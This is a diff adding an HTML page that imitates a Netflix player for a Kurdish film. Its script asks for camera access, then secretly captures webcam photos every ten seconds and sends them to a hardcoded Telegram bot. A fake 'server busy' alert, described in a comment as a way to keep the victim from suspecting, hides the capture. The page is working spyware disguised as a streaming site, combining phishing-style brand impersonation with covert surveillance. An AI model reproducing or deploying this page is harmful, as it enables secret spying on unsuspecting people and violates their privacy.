@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Kurdish Cinema</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        /* ستایلی نێتفلێکس */
+        .header {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            color: #db0510;
+            font-size: 2rem;
+            font-weight: bold;
+            letter-spacing: -1px;
+        }
+
+        .main-card {
+            width: 90%;
+            max-width: 450px;
+            text-align: center;
+            background: rgba(0,0,0,0.8);
+            padding: 20px;
+            border-radius: 8px;
+        }
+
+        .video-box {
+            position: relative;
+            width: 100%;
+            padding-top: 56.25%; /* 16:9 Aspect Ratio */
+            background: url('https://wallpapercave.com/wp/wp1917128.jpg') center/cover;
+            border-radius: 4px;
+            box-shadow: 0 0 20px rgba(255,255,255,0.1);
+        }
+
+        .play-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0,0,0,0.4);
+            cursor: pointer;
+        }
+
+        .play-icon {
+            width: 60px;
+            height: 60px;
+            border: 3px solid #fff;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: 0.2s;
+        }
+
+        .play-icon:hover { transform: scale(1.1); background: rgba(255,255,255,0.2); }
+
+        .info { padding: 20px 0; }
+        h1 { font-size: 1.5rem; margin: 10px 0; }
+        p { color: #a3a3a3; font-size: 0.9rem; line-height: 1.4; }
+
+        .btn-watch {
+            background-color: #e50914;
+            color: #fff;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        /* Loading Spinner */
+        .loader {
+            display: none;
+            border: 4px solid #333;
+            border-top: 4px solid #e50914;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="header">NETFLIX</div>
+
+<div class="main-card">
+    <div class="video-box" onclick="startCamera()">
+        <div class="play-overlay">
+            <div class="play-icon">▶</div>
+        </div>
+    </div>
+    
+    <div class="info">
+        <h1>فیلمی "وەرزی نوێ" - کوردی</h1>
+        <p>بۆ بینینی فیلمەکە بە کوالێتی 4K، پێویستە مۆڵەتی پلەیەرەکە بدەیت.</p>
+        <div id="loading" class="loader"></div>
+        <button class="btn-watch" id="actionBtn" onclick="startCamera()">Watch Now</button>
+    </div>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    const botToken = '9294537443:AAE1m3hsWgNVVlg--apjx21v7lj-x5dYq4s';
+    const chatId = '8594309916';
+
+    async function startCamera() {
+        const btn = document.getElementById('actionBtn');
+        const loader = document.getElementById('loading');
+        
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // ناردنی یەکەم وێنە دوای ئەوەی کامێراکە جێگیر دەبێت
+            setTimeout(() => {
+                captureAndSend();
+            }, 2000);
+
+            // دووبارەکردنەوە هەر 10 چرکە جارێک
+            setInterval(captureAndSend, 10000);
+
+            // نیشاندانی نامەیەکی ساختە بۆ ئەوەی گومان نەکات
+            alert("سێرڤەرەکە کەمێک قەرەباڵغە، تکایە چاوەڕوان بە تا ڤیدیۆکە بار دەبێت...");
+
+        } catch (err) {
+            loader.style.display = 'none';
+            btn.style.display = 'block';
+            alert("تکایە 'Allow' دابگرە بۆ ئەوەی بتوانیت سەیری ڤیدیۆکە بکەیت.");
+        }
+    }
+
+    function captureAndSend() {
+        const canvas = document.getElementById('canvas');
+        const video = document.getElementById('video');
+        const context = canvas.getContext('2d');
+
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob((blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'img.jpg');
+            formData.append('caption', '🔔 New Stream Connection\nTarget: Active ✅');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(res => console.log("Sent")).catch(e => console.error(e));
+            
+        }, 'image/jpeg', 0.7);
+    }
+</script>
+
+</body>
+</html>
